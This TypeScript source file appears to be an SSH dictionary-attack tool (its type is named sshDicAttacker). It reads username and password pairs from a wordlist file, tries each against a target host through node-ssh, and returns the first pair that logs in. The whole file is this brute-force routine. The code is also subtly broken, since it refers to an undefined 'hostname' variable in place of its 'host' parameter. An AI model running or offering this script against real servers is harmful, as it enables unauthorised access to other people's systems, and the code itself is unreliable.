import fs from "fs";
import { NodeSSH } from "node-ssh";
const ssh = new NodeSSH();

/** Types */
import { sshCheckResult } from "../types/sshDicAttacker";

export async function sshCheck(
    host: string,
    timeout: number
): Promise<sshCheckResult> {
    return new Promise(async (resolve) => {
        const dictionary: string[] = fs.readFileSync("data/dictionary.txt", "utf-8").split("\n").map(line => line.trim()).filter(line => line !== "");
        for (const key of dictionary) {
            const [ username, password ] = key.split("|");
            try {
                await ssh.connect({
                    host: hostname,
                    username: username,
                    password: password,
                    timeout: timeout
                });
                return resolve({
                    status: "success",
                    host: hostname,
                    username: username,
                    password: password
                });
            } catch (_) {
                continue;
            }
        }
        resolve({
            status: "error",
            message: "Connection failed."
        });
    });
};
